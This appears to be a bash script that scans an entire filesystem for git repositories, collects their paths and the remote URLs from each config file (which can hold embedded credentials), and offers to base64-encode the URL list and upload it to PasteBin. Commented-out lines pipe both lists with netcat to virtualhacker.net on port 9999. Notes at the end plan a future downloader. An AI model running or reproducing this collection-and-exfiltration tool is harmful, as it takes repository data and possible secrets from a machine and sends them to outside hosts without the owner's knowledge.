#!/bin/bash
echo Searching for git repositories...
cd=$(pwd)
rm -f urllist dirlist
# To know where to put the path names and the directory names and locations.
cd / ; find -name ".git" -type d 2>/dev/null | grep -v dradis | cut -c2- >$cd/gitlist


for url in $(cat $cd/gitlist)
do
cd $url ;  cat config 2>/dev/null | grep "http" | cut -c8- >>$cd/urllist ; cd .. && pwd >>$cd/dirlist 
done
echo "Results have been saved to urllist and dirlist."
echo
options=("Yes, use PasteBin" "No, don't use PasteBin")
select opt in "${options[@]}"
do
case $opt in
"Yes, use PasteBin")
echo "Converting list to Base64..."
cd $cd
base64 urllist >urllistbase64
echo "Prep complete, pushing to PasteBin"
echo $(pwd)
./pastebin.sh
echo "Have a nice day! :)"
break
;;
"No, don't use PasteBin")
echo "Alrighty then. Just use the urllist and dirlist." 
echo "Have a nice day!"
break
;;
esac
done

#echo Your directory list is here:
#cat $cd/dirlist | nc virtualhacker.net 9999
#echo Your URLlist is here:
#cat $cd/urllist | nc virtualhacker.net 9999

#[plan]
# Have dirlist read out line by line 
# Have separate file for downloaded locations
# [edit] Cat the files and see if the numbers are even or odd
# Then use even numbers for git link and odd for download locations
# Maybe add a downloader in the future
#
